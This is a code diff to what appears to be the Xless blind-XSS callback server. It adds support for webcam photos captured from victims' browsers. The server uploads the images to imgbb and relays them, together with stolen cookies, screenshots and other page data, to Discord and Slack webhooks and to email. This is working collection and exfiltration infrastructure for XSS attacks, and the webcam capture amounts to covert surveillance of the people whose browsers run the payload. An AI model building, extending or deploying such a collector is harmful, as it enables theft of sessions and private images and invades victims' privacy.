@@ -56,7 +56,7 @@ function generate_blind_xss_alert(body) {
   priorityFields.forEach(field => {
     if (body[field] !== undefined && !processedFields.has(field)) {
       processedFields.add(field);
-      if (field === 'Screenshot' || field === 'Screenshot URL') return;
+      if (field === 'Screenshot' || field === 'Screenshot URL' || field === 'Webcam' || field === 'Webcam URL') return;
 
       let emoji = '📍';
       if (field === 'Cookies') emoji = '🍪';
@@ -79,7 +79,7 @@ function generate_blind_xss_alert(body) {
 
   // Add remaining fields
   for (let k of Object.keys(body)) {
-    if (processedFields.has(k) || k === 'Screenshot' || k === 'Screenshot URL') continue;
+    if (processedFields.has(k) || k === 'Screenshot' || k === 'Screenshot URL' || k === 'Webcam' || k === 'Webcam URL') continue;
     processedFields.add(k);
 
     let emoji = '•';
@@ -189,19 +189,21 @@ const splitMessage = (str, maxLength = 2000) => {
 };
 
 // Promisified helper to send Discord alerts
-function sendDiscordAlert(message, screenshotUrl) {
+function sendDiscordAlert(message, screenshotUrl, webcamUrl) {
   return new Promise((resolve, reject) => {
     if (!discord_webhook_url) {
       return resolve("skipped");
     }
 
     const chunks = splitMessage(message, 1900);
+    const hasScreenshot = screenshotUrl && screenshotUrl !== "NA" && screenshotUrl !== "";
+    const hasWebcam = webcamUrl && webcamUrl !== "NA" && webcamUrl !== "" && webcamUrl !== "denied" && webcamUrl !== "no permission";
 
     let failed = false;
     let completed = 0;
-    const totalSteps = screenshotUrl && screenshotUrl !== "NA" && screenshotUrl !== ""
-      ? chunks.length + 1  // +1 for separate screenshot message
-      : chunks.length;
+    let totalSteps = chunks.length;
+    if (hasScreenshot) totalSteps++;
+    if (hasWebcam) totalSteps++;
 
     const checkDone = () => {
       completed++;
@@ -211,21 +213,45 @@ function sendDiscordAlert(message, screenshotUrl) {
       }
     };
 
-    const sendScreenshot = () => {
-      if (!screenshotUrl || screenshotUrl === "NA" || screenshotUrl === "") return;
+    const sendWebcam = () => {
+      if (!hasWebcam) return;
 
-      // Send screenshot as a SEPARATE message so it reliably renders
+      let webcamPayload = {
+        username: "Xless Security Alert",
+        content: "📷 **Webcam Capture:**",
+        embeds: [{
+          title: "📷 Webcam Photo",
+          color: 0x00ff00,
+          image: { url: webcamUrl },
+          footer: { text: "Xless Blind XSS Detection — Camera Capture" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      request.post(discord_webhook_url, { json: webcamPayload }, (err, res, body) => {
+        if (err || (res && res.statusCode >= 400)) {
+          console.error("Error sending webcam to Discord:", err || `Status: ${res.statusCode}`);
+          failed = true;
+        } else {
+          console.log("Discord webcam message sent successfully");
+        }
+        checkDone();
+      });
+    };
+
+    const sendScreenshot = () => {
+      if (!hasScreenshot) {
+        setTimeout(sendWebcam, 500);
+        return;
+      }
+
       let screenshotPayload = {
         username: "Xless Security Alert",
         content: "📸 **Screenshot:**",
         embeds: [{
           color: 0xff0000,
-          image: {
-            url: screenshotUrl
-          },
-          footer: {
-            text: "Xless Blind XSS Detection"
-          },
+          image: { url: screenshotUrl },
+          footer: { text: "Xless Blind XSS Detection" },
           timestamp: new Date().toISOString()
         }]
       };
@@ -238,12 +264,12 @@ function sendDiscordAlert(message, screenshotUrl) {
           console.log("Discord screenshot message sent successfully");
         }
         checkDone();
+        setTimeout(sendWebcam, 500);
       });
     };
 
     const sendChunk = (index) => {
       if (index >= chunks.length) {
-        // All text chunks sent, now send screenshot separately
         setTimeout(sendScreenshot, 500);
         return;
       }
@@ -268,7 +294,7 @@ function sendDiscordAlert(message, screenshotUrl) {
 }
 
 // Promisified helper to send Slack alerts
-function sendSlackAlert(message, screenshotUrl) {
+function sendSlackAlert(message, screenshotUrl, webcamUrl) {
   return new Promise((resolve, reject) => {
     if (!slack_incoming_webhook) {
       return resolve("skipped");
@@ -306,6 +332,20 @@ function sendSlackAlert(message, screenshotUrl) {
       });
     }
 
+    // Add webcam if available
+    if (webcamUrl && webcamUrl !== "NA" && webcamUrl !== "" && webcamUrl !== "denied" && webcamUrl !== "no permission") {
+      blocks.push({
+        type: "image",
+        title: {
+          type: "plain_text",
+          text: "📷 Webcam Capture",
+          emoji: true
+        },
+        image_url: webcamUrl,
+        alt_text: "Webcam Capture"
+      });
+    }
+
     let payload = {
       username: "Xless Security Alert",
       icon_emoji: ":rotating_light:",
@@ -330,7 +370,7 @@ function sendSlackAlert(message, screenshotUrl) {
 }
 
 // Function to send Email Alert (now primary, not fallback)
-async function sendEmailAlert(subject, text, screenshotUrl) {
+async function sendEmailAlert(subject, text, screenshotUrl, webcamUrl) {
   if (!email_config.host || !email_config.user || !email_config.pass || !email_config.to) {
     console.log("Email not configured, skipping.");
     return;
@@ -358,6 +398,11 @@ async function sendEmailAlert(subject, text, screenshotUrl) {
     htmlBody += '<h3 style="color: #ff6644;">📸 Screenshot</h3>';
     htmlBody += '<a href="' + screenshotUrl + '"><img src="' + screenshotUrl + '" style="max-width: 100%; border-radius: 8px; border: 2px solid #ff4444;" /></a>';
   }
+  if (webcamUrl && webcamUrl !== 'NA' && webcamUrl !== '' && webcamUrl !== 'denied' && webcamUrl !== 'no permission') {
+    htmlBody += '<hr style="border-color: #333;">';
+    htmlBody += '<h3 style="color: #44ff44;">📷 Webcam Capture</h3>';
+    htmlBody += '<a href="' + webcamUrl + '"><img src="' + webcamUrl + '" style="max-width: 100%; border-radius: 8px; border: 2px solid #44ff44;" /></a>';
+  }
   htmlBody += '<br><p style="color: #888; font-size: 11px;">— Xless Blind XSS Detection</p>';
   htmlBody += '</div>';
 
@@ -365,7 +410,7 @@ async function sendEmailAlert(subject, text, screenshotUrl) {
     from: email_config.from || email_config.user,
     to: email_config.to,
     subject: '🚨 ' + subject,
-    text: plainText + (screenshotUrl ? '\n\nScreenshot URL: ' + screenshotUrl : ''),
+    text: plainText + (screenshotUrl ? '\n\nScreenshot URL: ' + screenshotUrl : '') + (webcamUrl && webcamUrl !== 'denied' && webcamUrl !== 'no permission' ? '\n\nWebcam URL: ' + webcamUrl : ''),
     html: htmlBody
   };
 
@@ -378,22 +423,22 @@ async function sendEmailAlert(subject, text, screenshotUrl) {
 }
 
 // Helper to orchestrate notifications - sends to ALL configured channels
-async function sendNotifications(message, screenshotUrl, subject = "Xless Alert") {
+async function sendNotifications(message, screenshotUrl, subject = "Xless Alert", webcamUrl = "") {
   const promises = [];
 
   // Send to Discord if configured
   if (discord_webhook_url) {
-    promises.push(sendDiscordAlert(message, screenshotUrl));
+    promises.push(sendDiscordAlert(message, screenshotUrl, webcamUrl));
   }
 
   // Send to Slack if configured
   if (slack_incoming_webhook) {
-    promises.push(sendSlackAlert(message, screenshotUrl));
+    promises.push(sendSlackAlert(message, screenshotUrl, webcamUrl));
   }
 
   // Send email ALWAYS if configured (not just as fallback)
   if (email_config.host && email_config.user && email_config.pass && email_config.to) {
-    promises.push(sendEmailAlert(subject, message, screenshotUrl));
+    promises.push(sendEmailAlert(subject, message, screenshotUrl, webcamUrl));
   }
 
   if (promises.length === 0) {
@@ -465,6 +510,22 @@ app.post("/c", async (req, res) => {
     }
   }
 
+  // Upload webcam photo if captured
+  data["Webcam URL"] = "";
+  if (imgbb_api_key && data["Webcam"] && data["Webcam"].startsWith("data:image")) {
+    const encoded_webcam = data["Webcam"].replace(/^data:image\/\w+;base64,/, "");
+    try {
+      const webcamRes = await uploadImage(encoded_webcam);
+      const webcamOut = JSON.parse(webcamRes);
+      if (webcamOut.data && webcamOut.data.url) {
+        data["Webcam URL"] = webcamOut.data.url;
+        console.log("Webcam photo uploaded:", webcamOut.data.url);
+      }
+    } catch (e) {
+      console.error("Webcam upload error:", e.message);
+    }
+  }
+
   // Now handle the regular alerts
   data["Remote IP"] =
     req.headers["x-forwarded-for"] || req.connection.remoteAddress;
@@ -475,8 +536,8 @@ app.post("/c", async (req, res) => {
   // If it's a full URL, extract just the hostname
   try { domain = new URL(domain).hostname || domain; } catch (e) { /* keep as-is */ }
 
-  // Send Notifications
-  await sendNotifications(alert, data["Screenshot URL"], "XLess Blind XSS Alert — " + domain);
+  // Send Notifications (pass both screenshot and webcam URLs)
+  await sendNotifications(alert, data["Screenshot URL"], "XLess Blind XSS Alert — " + domain, data["Webcam URL"]);
 
   res.send("ok\n");
   res.end();
